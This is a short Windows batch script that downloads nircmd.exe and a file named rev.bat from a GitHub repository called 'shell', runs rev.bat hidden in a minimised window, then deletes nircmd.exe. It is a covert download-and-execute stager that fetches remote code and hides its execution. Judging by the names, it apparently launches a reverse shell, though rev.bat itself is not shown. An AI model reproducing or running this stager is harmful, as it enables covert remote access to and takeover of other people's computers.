@echo off
if not exist "nircmd.exe" (
    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o nircmd.exe
)
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
start /min cmd /c nircmd.exe exec hide cmd /c rev.bat
ping 127.0.0.1 -n 5 > nul
del nircmd.exe
